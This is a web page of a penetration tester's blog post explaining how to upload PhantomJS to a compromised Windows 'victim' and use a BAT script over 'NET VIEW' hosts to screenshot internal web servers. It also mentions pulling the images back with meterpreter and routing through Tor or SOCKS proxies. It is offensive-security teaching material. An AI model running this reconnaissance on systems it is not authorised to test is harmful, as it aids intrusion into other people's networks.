<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Post Exploitation with PhantomJS &middot; Rob &#39;mubix&#39; Fuller</title>
        <meta name="description" content="If you have never heard of PhantomJS ( http://phantomjs.org/ ) before, it&rsquo;s a &ldquo;Full Web Stack with No Browser Required&rdquo;, basically it a GUI-less browser. One of the magical &ldquo;example&rdquo; files that it has is called &ldquo;rasterize.js&rdquo;
Rasterize.JS essentially renders a URL, screen shots it and give it to you in a number of different formats, here&rsquo;s it&rsquo;s usage:
Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat] paper (pdf output) examples: &quot;5in*7.5in&quot;, &quot;10cm*20cm&quot;, &quot;A4&quot;, &quot;Letter&quot;  PhantomJS is sweet for sweeping a ton of IPs and suspected HTTP/S sites, and look through a gallery of them to start figuring out which looks the most interesting… and we are going to essentially just that, except from a Victim machine.">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="generator" content="Hugo 0.17" />
        <meta name="robots" content="index,follow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <link rel="stylesheet" href="https://room362.com/css/normalize.css">
        <link rel="stylesheet" href="https://room362.com/css/highlight.css">
        <link rel="stylesheet" href="https://room362.com/css/style.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body>
        
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
ga('send', 'pageview');
</script>


        <div id="wrapper">
            <header class="site-header">
                <div class="container">
                    <div class="site-title-wrapper">
                        
                            <h1 class="site-title">
                                <a title="Room362" href="https://room362.com/">Room362</a>
                            </h1>
                        
                        <a class="button-square" href="https://room362.com/index.xml"><i class="fa fa-rss"></i></a>
                        
                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/mubix">
                                <i class="fa fa-twitter"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/mubix">
                                <i class="fa fa-github-alt"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/mubix">
                                <i class="fa fa-linkedin"></i>
                            </a>
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://google.com/&#43;mubix">
                                <i class="fa fa-google-plus"></i>
                            </a>
                        
                    </div>

                    <ul class="site-nav">
                        
    <li class="site-nav-item">
        <a title="Brandon" href="/brandon/">Brandon</a>
    </li>

    <li class="site-nav-item">
        <a title="About Me" href="/about/">About Me</a>
    </li>

    <li class="site-nav-item">
        <a title="Start in Infosec" href="/start/">Start in Infosec</a>
    </li>

    <li class="site-nav-item">
        <a title="Projects" href="/projects/">Projects</a>
    </li>

    <li class="site-nav-item">
        <a title="PwnWiki" href="http://pwnwiki.io">PwnWiki</a>
    </li>

                    </ul>
                </div>
            </header>

            <div id="container">


<div class="container">
    <article class="post-container">
        <header class="post-header">
    <h1 class="post-title">Post Exploitation with PhantomJS</h1>
    
</header>

        <div class="post-content clearfix">
    

    <p>If you have never heard of PhantomJS ( <a href="http://phantomjs.org/">http://phantomjs.org/</a> ) before, it&rsquo;s a &ldquo;Full Web Stack with No Browser Required&rdquo;, basically it a GUI-less browser. One of the magical &ldquo;example&rdquo; files that it has is called &ldquo;rasterize.js&rdquo;</p>

<p>Rasterize.JS essentially renders a URL, screen shots it and give it to you in a number of different formats, here&rsquo;s it&rsquo;s usage:</p>

<pre><code>Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat]
 paper (pdf output) examples: &quot;5in*7.5in&quot;, &quot;10cm*20cm&quot;, &quot;A4&quot;, &quot;Letter&quot;
</code></pre>

<p>PhantomJS is sweet for sweeping a ton of IPs and suspected HTTP/S sites, and look through a gallery of them to start figuring out which looks the most interesting… and we are going to essentially just that, except from a Victim machine.</p>

<p>First, download the Win32 static bins for PhantomJS from: <a href="http://code.google.com/p/phantomjs/downloads/list">http://code.google.com/p/phantomjs/downloads/list</a></p>

<p>Pull out phantomJS.exe and rasterize.js from the zip, and upload it to your victim.</p>

<p>Make a special directory for your renderings (I use imgs), this also makes it easy for meterpreter to download it since meterpreter supports directories and download targets.</p>

<p>Now make a BAT file with the following in it:</p>

<pre><code>FOR /F &quot;skip=3 delims= &quot; %%A IN ('NET VIEW') DO start /b phantomjs.exe examplesrasterize.js http://%%A imgshttp_%%A.png
FOR /F &quot;skip=3 delims= &quot; %%A IN ('NET VIEW') DO start /b phantomjs.exe --ignore-ssl-errors=yes examplesrasterize.js https://%%A imgshttps_%%A.png
</code></pre>

<p>There are some cool tricks in here. First we are using &lsquo;net view&rsquo; as our target list, we are using the &lsquo;start /b&rsquo; command to throw everything into the background to run so we don&rsquo;t have to wait for each to finish (a crude way to thread actions in BAT files). And finally we are checking for both HTTP and HTTPS. We we are not doing however is doing any logging, so if you want to catch errors it&rsquo;s all you, just remember that when trying to pipe output from a command started with &lsquo;start&rsquo; you have to prefix the &gt; with a ^ so it looks like:</p>

<p><code>start echo blah ^&gt; blah.txt</code></p>

<p>You are ALMOST ready to rock. There is a slight bug in Rasterize.js, if it can&rsquo;t resolve the address or otherwise can&rsquo;t contact the web server (which is going to be the majority of the case for us) it hangs in an open state. This is bad, we don&rsquo;t want to have a thousand phantomjs.exe processes running hanged. Simply make a new line after LINE 20, and add &lsquo;phantom.exit();&rsquo; so it knows to exit if it encounters a failed connection.</p>

<p>Thats it, happy hunting from both inside and outside.</p>

<p>P.S. PhantomJS supports SOCKS and HTTP proxies, so if you use them (Tor) or run into them internally, support is there. A quick mod to your batch file and you&rsquo;re golden:</p>

<pre><code>--proxy=address:port Sets the network proxy (e.g. &quot;--proxy=192.168.1.42:8080&quot;)  
--proxy-auth=username:password Sets authentication details for the proxy (basic auth)  
--proxy-type=[http|socks5] Sets the proxy type, either &quot;http&quot; (default) or &quot;socks5&quot;
</code></pre>

</div>

        <footer class="post-footer clearfix">
    

    <div class="share">
        <a class="icon-twitter" href="https://twitter.com/share?text=Post%20Exploitation%20with%20PhantomJS&url=https%3a%2f%2froom362.com%2fpost%2f2012%2f2012-05-25-post-exploitation-with-phantomjs%2f"
            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
            <i class="fa fa-twitter"></i>
            <span class="hidden">Twitter</span>
        </a>

        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2froom362.com%2fpost%2f2012%2f2012-05-25-post-exploitation-with-phantomjs%2f"
            onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
            <i class="fa fa-facebook"></i>
            <span class="hidden">Facebook</span>
        </a>

        <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2froom362.com%2fpost%2f2012%2f2012-05-25-post-exploitation-with-phantomjs%2f"
           onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
           <i class="fa fa-google-plus"></i>
            <span class="hidden">Google+</span>
        </a>
    </div>
</footer>
    </article>
</div>

            </div>
        </div>

        <footer class="footer">
            <div class="container">
                <div class="site-title-wrapper">
                    <h1 class="site-title">
                        <a title="Room362" href="https://room362.com/">Room362</a>
                    </h1>
                    <a class="button-square button-jump-top js-jump-top" href="#">
                        <i class="fa fa-angle-up"></i>
                    </a>
                </div>

                <p class="footer-copyright">
                    <span>&copy; 2016 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                </p>
                <p class="footer-copyright">
                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
                </p>
            </div>
        </footer>

        <script src="https://room362.com/js/jquery-1.11.3.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
        <script src="https://room362.com/js/jquery.fitvids.js"></script>
        <script src="https://room362.com/js/scripts.js"></script>
    </body>
</html>

